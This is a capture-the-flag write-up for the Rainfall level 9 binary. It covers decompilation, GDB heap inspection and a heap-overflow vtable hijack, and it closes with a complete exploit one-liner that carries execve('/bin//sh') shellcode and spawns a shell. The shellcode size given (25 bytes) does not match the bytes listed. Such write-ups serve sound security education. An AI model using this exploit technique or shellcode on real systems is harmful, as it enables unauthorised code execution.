@@ -1,0 +1,104 @@
+Rainfall — Level 9 Writeup
+
+Decompilation
+
+We opened the binary in Ghidra. Two functions stood out immediately.
+
+main allocates two objects of type N on the heap (108 bytes each via operator_new(0x6c)), constructs them with values 5 and 6, copies argv[1] into the first object via setAnnotation, then calls a virtual method on the second object — passing the first object as argument.
+
+cvoid main(int param_1, int param_2)
+{
+  N *this;
+  N *this_00;
+
+  if (param_1 < 2) {
+    _exit(1);
+  }
+  this = operator_new(0x6c);
+  N::N(this, 5);
+  this_00 = operator_new(0x6c);
+  N::N(this_00, 6);
+  N::setAnnotation(this, *(char **)(param_2 + 4));
+  (*(code *)**(undefined4 **)this_00)(this_00, this);
+  return;
+}
+
+setAnnotation copies the argument into this + 4 using memcpy — with no bounds check:
+
+cvoid __thiscall N::setAnnotation(N *this, char *param_1)
+{
+  size_t __n;
+
+  __n = strlen(param_1);
+  memcpy(this + 4, param_1, __n);
+  return;
+}
+
+Vulnerability identification
+
+From this we identified three key facts.
+
+First, memcpy in setAnnotation copies strlen(param_1) bytes with no bounds check — that's our overflow vector. Whatever we pass as argv[1] gets written into the heap starting at this + 4, and we control both the content and the length.
+
+Second, argv[1] is the direct source of the write — we have full control over the input.
+
+Third, main creates two N objects in sequence. We can identify them in GDB by their constructor arguments: the first object gets 5, the second gets 6. Since they're allocated consecutively on the heap, the second object sits immediately after the first — which means a large enough write into the first object will overflow into the second.
+
+Locating the objects in memory
+
+To confirm the heap layout we disassembled main in GDB and set breakpoints right after each operator_new call — specifically at the instructions where the return value (eax) is moved into ebx, marked below:
+
+asm0x0804861c <+40>:  mov %eax,%ebx    ; <- object 1 address
+...
+0x0804863e <+74>:  mov %eax,%ebx    ; <- object 2 address
+
+Reading eax at each breakpoint gave us the heap addresses of both objects:
+
+$2 = (void *) 0x804a008   ; object 1 (constructor arg 5)
+$3 = (void *) 0x804a078   ; object 2 (constructor arg 6)
+
+The distance between them is 0x804a078 - 0x804a008 = 0x70 = 112 bytes, which matches the allocation size of 0x6c (108 bytes) plus 4 bytes of heap metadata. The two objects sit back to back in memory.
+
+Inspecting the heap
+
+We set a breakpoint at +136 (just after setAnnotation returns, before the virtual call) and ran ./level9 AAAA. Examining the heap from 0x804a008:
+
+0x804a008:  0x08048848  0x41414141  0x00000000  0x00000000
+...
+0x804a068:  0x00000000  0x00000000  0x00000005  0x00000071
+0x804a078:  0x08048848  0x00000000  0x00000000  0x00000000
+...
+0x804a0d8:  0x00000000  0x00000000  0x00000006  0x00020f21
+
+A few things are immediately visible. Our AAAA payload (0x41414141) landed at 0x804a00c — 4 bytes into object 1, right where setAnnotation writes (this + 4). The constructor arguments 5 and 6 are visible near the end of each object at 0x804a06c and 0x804a0dc, which confirms we're looking at the right objects. And both objects start with 0x08048848 — that's their vtable pointer, sitting at offset 0 of each object.
+
+A vtable is a table of function pointers that C++ uses to dispatch virtual method calls. When main executes (*(code *)**(undefined4 **)this_00)(this_00, this), it reads the vtable pointer from offset 0 of object 2, then dereferences it to get the function address to call. If we can overwrite that vtable pointer, we control execution.
+
+Exploit plan and execution
+
+With the layout confirmed, the attack plan is straightforward. We need to overwrite the vtable pointer of object 2 so that when the virtual call fires, execution lands in memory we control.
+
+The write starts at 0x804a00c (object 1 + 4). Object 2's vtable pointer sits at 0x804a078 (offset 0). The distance between them is 0x804a078 - 0x804a00c = 0x6c = 108 bytes, but since our write starts at 0x804a00c and we need to place our fake vtable pointer at 0x804a078, we need 108 bytes of content before the overwrite value.
+
+The payload is structured in three parts:
+
+
+0x804a010 — a pointer to the next 4 bytes, placed at 0x804a00c. This becomes the fake vtable: a table containing a single entry pointing into our shellcode.
+25 bytes of shellcode — a standard 32-bit execve("/bin//sh") placed at 0x804a010, immediately after the fake vtable pointer.
+83 bytes of filler — padding to reach exactly 0x804a078, followed by 0x804a00c to overwrite object 2's vtable pointer with the address of our fake vtable.
+
+
+When the virtual call executes, it reads the vtable pointer from object 2 (0x804a00c), dereferences it to get the function pointer (0x804a010), and jumps there — straight into our shellcode.
+
+bash./level9 $(python2 -c 'import sys; sys.stdout.write(
+    "\x10\xa0\x04\x08"         # fake vtable entry -> shellcode at 0x804a010
+    "\x6a\x0b\x58\x99\x52"
+    "\x68\x2f\x2f\x73\x68"
+    "\x68\x2f\x62\x69\x6e"
+    "\x89\xe3\x31\xc9\xcd\x80" # execve("/bin//sh") shellcode (25 bytes total)
+    + "A"*83                    # padding to reach object 2 vtable pointer
+    + "\x0c\xa0\x04\x08"       # overwrite vtable pointer -> 0x804a00c
+)')
+
+$ whoami
+bonus0
